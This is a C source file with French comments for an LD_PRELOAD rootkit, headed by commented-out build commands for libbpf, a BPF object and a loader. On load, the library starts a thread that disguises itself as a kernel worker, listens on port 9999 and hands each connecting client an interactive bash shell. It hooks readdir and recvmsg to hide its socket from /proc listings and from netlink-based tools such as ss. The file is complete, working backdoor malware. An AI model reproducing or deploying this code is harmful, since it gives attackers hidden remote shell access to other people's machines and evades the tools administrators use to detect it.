
/*# Récupération des sources de libbpf
git clone https://github.com/libbpf/libbpf.git
cd libbpf/src
# Compilation statique locale
make OBJDIR=../build DESTDIR=../install install
cd ../..
# Compilation de l'objet BPF avec les headers locaux
clang -O2 -target bpf \
      -I./libbpf/install/usr/include \
      -c ghost.bpf.c -o ghost.bpf.o

# Compilation du loader avec la bibliothèque statique
gcc loader.c -o loader \
    -I./libbpf/install/usr/include \
    -L./libbpf/build \
    -l:libbpf.a -lelf -lz
    gcc -fPIC -shared -o hijack.so hijack.c -ldl -lpthread
    LD_PRELOAD=$PWD/hijack.so nc -l -p 8888*/


#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <linux/netlink.h>
#include <linux/inet_diag.h>
#include <dirent.h>
#include <fcntl.h>

#define GHOST_PORT 9999
#define KILL_SWITCH "/tmp/.ghost_off"

static int ghost_fd = -1; // Stockage dynamique du FD pour readdir

typedef int (*bind_t)(int, const struct sockaddr *, socklen_t);
typedef struct dirent* (*readdir_t)(DIR *);
typedef ssize_t (*recvmsg_t)(int, struct msghdr *, int);

// --- Masquage dynamique du File Descriptor ---
struct dirent *readdir(DIR *dirp) {
    static readdir_t real_readdir = NULL;
    if (!real_readdir) real_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    while ((entry = real_readdir(dirp))) {
        if (ghost_fd != -1) {
            char fd_str[10];
            snprintf(fd_str, sizeof(fd_str), "%d", ghost_fd);
            if (strcmp(entry->d_name, fd_str) == 0) continue; 
        }
        break;
    }
    return entry;
}

// --- Filtrage Netlink robuste (ss) ---
ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags) {
    static recvmsg_t real_recvmsg = NULL;
    if (!real_recvmsg) real_recvmsg = (recvmsg_t)dlsym(RTLD_NEXT, "recvmsg");

    ssize_t ret = real_recvmsg(sockfd, msg, flags);
    if (ret <= 0 || msg->msg_iovlen <= 0) return ret;

    struct nlmsghdr *nlh = (struct nlmsghdr *)msg->msg_iov[0].iov_base;
    ssize_t remaining = ret;

    while (NLMSG_OK(nlh, remaining)) {
        if (nlh->nlmsg_type == NLMSG_DONE) break;
        
        struct inet_diag_msg *diag = NLMSG_DATA(nlh);
        // On vérifie le port source (le nôtre)
        if (diag->id.idiag_sport == htons(GHOST_PORT)) {
            size_t msg_len = NLMSG_ALIGN(nlh->nlmsg_len);
            unsigned char *next_msg = (unsigned char *)nlh + msg_len;
            ssize_t tail_size = remaining - msg_len;

            if (tail_size > 0) memmove(nlh, next_msg, tail_size);
            ret -= msg_len;
            remaining -= msg_len;
            continue;
        }
        nlh = NLMSG_NEXT(nlh, remaining);
    }
    return ret;
}

void *ghost_listener(void *arg) {
    int server_fd, client_fd;
    struct sockaddr_in addr;
    int opt = 1;

    prctl(PR_SET_NAME, "[kworker/u24:5]", 0, 0, 0);
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    ghost_fd = server_fd; // On capture le FD réel
    
    // Empêcher l'héritage du socket par les processus enfants (ex: bash)
    fcntl(server_fd, F_SETFD, FD_CLOEXEC);

    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(GHOST_PORT);

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) return NULL;
    listen(server_fd, 3);

    while (1) {
        if (access(KILL_SWITCH, F_OK) == 0) {
            kill(0, SIGTERM);
            exit(0);
        }

        struct timeval tv = {1, 0};
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(server_fd, &fds);
        
        if (select(server_fd + 1, &fds, NULL, NULL, &tv) > 0) {
            if ((client_fd = accept(server_fd, NULL, NULL)) >= 0) {
                if (fork() == 0) {
                    close(server_fd);
                    unsetenv("LD_PRELOAD");
                    dup2(client_fd, 0); dup2(client_fd, 1); dup2(client_fd, 2);
                    execl("/bin/bash", "bash", "--noprofile", "--norc", "-i", NULL);
                    exit(0);
                }
                close(client_fd);
            }
        }
    }
}

int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    static bind_t real_bind = NULL;
    if (!real_bind) real_bind = (bind_t)dlsym(RTLD_NEXT, "bind");
    int opt = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));
    return real_bind(sockfd, addr, addrlen);
}

__attribute__((constructor))
void init_ghost() {
    pthread_t tid;
    pthread_create(&tid, NULL, ghost_listener, NULL);
    pthread_detach(tid);
}